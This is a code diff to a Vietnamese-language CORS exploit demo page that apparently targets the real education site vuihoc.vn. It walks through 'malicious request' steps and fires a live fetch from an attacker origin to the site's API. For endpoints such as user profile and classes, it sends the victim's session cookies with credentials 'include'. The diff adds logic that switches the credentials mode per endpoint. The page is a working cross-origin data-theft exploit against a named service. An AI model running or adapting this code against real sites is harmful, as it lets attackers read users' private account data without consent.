@@ -129,21 +129,34 @@
             log("━━━ BƯỚC 1/4: Chuẩn bị request độc hại ━━━", 'warn');
             await sleep(500);
 
+            // Endpoint /v1/api/course/by/grade KHÔNG cần auth
+            // → không cần gửi cookie, dùng credentials: 'omit'
+            // Endpoint cần auth (me/classes, user/profile) → dùng credentials: 'include'
+            const needsAuth = TARGET_API.includes('/me/') ||
+                              TARGET_API.includes('/users/me') ||
+                              TARGET_API.includes('/user/profile');
+            const credsMode = needsAuth ? 'include' : 'omit';
+
+            log(`[*] Endpoint cần auth: ${needsAuth ? 'CÓ' : 'KHÔNG'}`, 'info');
+            log(`[*] Chế độ credentials: ${credsMode}`, 'info');
+            if (!needsAuth) {
+                log("[*] → Dùng credentials: 'omit' (không gửi cookie)", 'success');
+                log("[*] → Endpoint public, server trả data cho bất kỳ ai", 'info');
+            } else {
+                log("[*] → Dùng credentials: 'include' (gửi cookie của nạn nhân)", 'info');
+            }
+            await sleep(500);
+
             const requestInfo = `fetch("${TARGET_API}", {
     method: "GET",
-    credentials: "include",        // ← Bắt buộc: gửi kèm cookie của nạn nhân
+    credentials: "${credsMode}",
     headers: {
-        "Accept": "application/json",
-        "Origin": "${HACKER_ORIGIN}"
+        "Accept": "application/json"
     }
 })`;
             log("JavaScript chạy trong trình duyệt nạn nhân:", 'info');
             showCode(requestInfo);
             await sleep(800);
-
-            log("[*] Trình duyệt sẽ tự động đính kèm cookie vuihoc.vn (session) vào request", 'info');
-            log("[*] Cookie được gửi VÌ credentials: 'include' được set", 'info');
-            await sleep(500);
 
             // ============================================================
             // BƯỚC 2: GỬI REQUEST
@@ -153,14 +166,18 @@
             await sleep(500);
             log(`→ GET ${TARGET_API}`, 'info');
             log(`→ Origin: ${HACKER_ORIGIN}`, 'info');
-            log(`→ Cookie: <tự động đính kèm session của nạn nhân>`, 'info');
+            if (needsAuth) {
+                log(`→ Cookie: <tự động đính kèm session của nạn nhân>`, 'info');
+            } else {
+                log(`→ Cookie: <không gửi - endpoint public>`, 'info');
+            }
             await sleep(800);
 
             try {
                 // Gọi API thật
                 const response = await fetch(TARGET_API, {
                     method: 'GET',
-                    credentials: 'include',
+                    credentials: credsMode,
                     headers: {
                         'Accept': 'application/json'
                         // KHÔNG set Origin header manually - browser tự thêm!
